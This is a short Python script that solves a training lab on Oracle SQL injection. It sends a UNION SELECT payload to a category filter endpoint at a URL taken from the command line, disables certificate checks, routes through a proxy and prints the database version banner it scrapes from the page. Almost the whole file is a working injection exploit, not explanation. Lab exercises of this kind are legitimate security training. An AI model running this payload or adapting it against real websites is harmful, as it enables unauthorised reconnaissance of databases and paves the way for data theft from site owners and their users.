# Lab: SQLi attack, querying the database type and version on Oracle
import os
import sys
from bs4 import BeautifulSoup
import requests
import urllib3
from dotenv import load_dotenv

load_dotenv()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': "http://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT"),
    'https': "https://" + os.getenv("PROXY_IP") + ":" + os.getenv("PROXY_PORT")
}


def get_db_type_and_version(url):
    category_path = "/filter?category=Gifts"
    sql_payload = "'+UNION+SELECT+banner,NULL+FROM+v$version--"

    r = requests.get(url + category_path + sql_payload, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    if r.status_code == 200:
        db = soup.body.find(text="ubuntu").parent.findNext('td').contents[0]
        print(db)
    else:
        exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(-> Usage: %s <url>" % sys.argv[0])
        print("(-> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]

    get_db_type_and_version(url)

if __name__ == "__main__":
    main()
